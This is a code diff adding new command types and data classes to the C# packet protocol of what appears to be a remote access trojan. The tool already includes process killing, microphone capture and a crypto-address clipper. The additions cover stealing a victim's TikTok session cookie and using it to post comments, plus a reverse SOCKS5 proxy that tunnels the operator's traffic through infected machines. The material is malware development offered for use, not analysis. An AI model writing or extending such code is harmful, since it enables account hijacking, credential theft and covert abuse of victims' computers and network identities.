@@ -109,6 +109,20 @@ public enum PacketType
     ProcListResult = 191, // client→server: [{Pid, Name, Memory, Title, ExePath}]
     ProcKill      = 192,  // server→client: {Pid}
 
+    // TikTok
+    TikTokComment      = 210,  // server→client: {VideoId, Text, Cookie}
+    TikTokCommentAck   = 211,  // client→server: {Success, Error}
+    TikTokDetectCookie = 212,  // server→client: detect session on machine
+    TikTokCookieResult = 213,  // client→server: {Cookie, Found}
+
+    // Reverse SOCKS5 Proxy
+    SocksStart  = 200,  // server→client: {LocalPort} — open SOCKS5 listener on server side
+    SocksStop   = 201,  // server→client: stop proxy
+    SocksData   = 202,  // bidirectional: {SessionId, Data (base64)}
+    SocksClose  = 203,  // bidirectional: {SessionId}
+    SocksConnOk = 204,  // client→server: {SessionId} connection established
+    SocksConnErr = 205, // client→server: {SessionId, Error}
+
     // Crypto Clipper
     ClipperSetConfig   = 180,  // server→client: {Enabled, Addresses:{BTC,ETH,...}}
     ClipperGetStats    = 181,  // server→client: request stats
@@ -345,6 +359,23 @@ public class MicDataPacket        { public string Data { get; set; } = string.Em
 // ── Fun ───────────────────────────────────────────────
 public class FunCmdData    { public string Action { get; set; } = string.Empty; public string Param { get; set; } = string.Empty; }
 public class FunResultData { public string Action { get; set; } = string.Empty; public string Result { get; set; } = string.Empty; }
+
+// ── TikTok ───────────────────────────────────────────
+public class TikTokCommentData
+{
+    public string VideoId    { get; set; } = string.Empty;
+    public string Text       { get; set; } = string.Empty;
+    public string Cookie     { get; set; } = string.Empty;
+    public bool   IsLiveroom { get; set; }   // true = comment on livestream
+}
+public class TikTokCommentAckData  { public bool Success { get; set; } public string Error  { get; set; } = string.Empty; }
+public class TikTokCookieResultData { public string Cookie { get; set; } = string.Empty; public bool Found { get; set; } }
+
+// ── SOCKS5 Proxy ─────────────────────────────────────
+public class SocksStartData  { public int LocalPort { get; set; } = 1080; }
+public class SocksDataPacket { public string SessionId { get; set; } = ""; public string Data { get; set; } = ""; }
+public class SocksCloseData  { public string SessionId { get; set; } = ""; }
+public class SocksConnResult { public string SessionId { get; set; } = ""; public string Error { get; set; } = ""; }
 
 // ── Process Manager ──────────────────────────────────
 public class ProcEntry
